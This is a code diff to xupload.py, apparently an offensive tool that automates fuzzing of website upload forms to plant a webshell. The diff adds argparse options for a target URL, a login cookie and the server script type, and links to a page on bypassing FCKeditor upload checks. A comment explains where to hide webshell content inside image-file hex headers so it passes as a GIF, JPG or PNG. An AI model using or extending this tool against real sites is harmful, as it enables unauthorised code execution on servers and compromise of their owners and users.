@@ -234,11 +234,7 @@ def fuzz_upload_webshell():
         fuzz_content_type.append(item)
 
     for filename_item in fuzz_file_name:
-        try:
-            print(filename_item['desc'])
-        except:
-            print(filename_item)
-            pdb.set_trace()
+        print(filename_item['desc'])
         filename = filename_item['modify']['filename']
         file_content = work_file_info['file_content']
         content_type = work_file_info['content_type']
@@ -267,14 +263,19 @@ def fuzz_upload_webshell():
             check_upload_succeed(rsp, origin_html)
 
 
-parser = argparse.ArgumentParser()
-parser.add_argument("-u", "--url")
-parser.add_argument("--cookie")
-parser.add_argument("--suffix")
+parser = argparse.ArgumentParser(
+    description="xupload.py is a program that automates the testing of uploading functionality. If xupload.py does not successfully upload webshell, try out more tips on this link: http://3xp10it.cc/web/2016/08/12/fckeditor各版本绕过/")
+parser.add_argument(
+    "-u", "--url", required=True, help="The target url which has upload function")
+parser.add_argument(
+    "--cookie", help="If the target url can only be visited after login,then cookie is needed")
+parser.add_argument(
+    "--suffix", required=True, help="The web server's script type: 'php','asp','aspx','jsp'")
 args = parser.parse_args()
 url = args.url
 cookie = args.cookie
 script_suffix = args.suffix
+
 """
 gif_file_content,jpg_file_content,png_file_content都是从正常的对应文件的16进制中
 抽取的前2行和最后2行的16进制数据,如果要插入webshell内容则最好在第2行之后第3行之前
